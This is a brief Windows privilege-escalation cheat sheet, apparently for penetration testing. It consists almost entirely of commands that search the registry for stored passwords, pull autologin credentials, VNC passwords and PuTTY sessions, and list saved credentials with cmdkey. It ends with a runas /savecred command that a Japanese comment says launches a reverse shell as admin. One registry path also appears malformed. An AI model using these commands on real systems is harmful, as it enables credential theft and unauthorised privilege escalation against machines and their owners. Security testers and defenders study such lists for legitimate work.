```powershell
reg query HKLM /f password /t REG_SZ /s
```

```powershell
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
```

## VNC
```powershell
reg query "HKCU\Software\ORL\WinVNC3\Password"  
```

```powershell
reg query "HKCU\Software\TightVNC\Server"  
```

## Windows autologin  
```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"  
```

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"  
```

## SNMP Paramters  
```powershell
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"  
```

## Putty  
```powershell
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"  
```

#### Search for password in registry  
```powershell
reg query HKLM /f password /t REG_SZ /s  
```

```powershell
reg query HKCU /f password /t REG_SZ /s
```

### RunAs - Savedcreds
```cmd
cmdkey /list 
```
保存されている資格情報を表示し、任意のオプション ユーザーを検索します

```cmd
runas /savecred /user:admin C:\Temp\reverse.exe
```
リバースシェルを転送します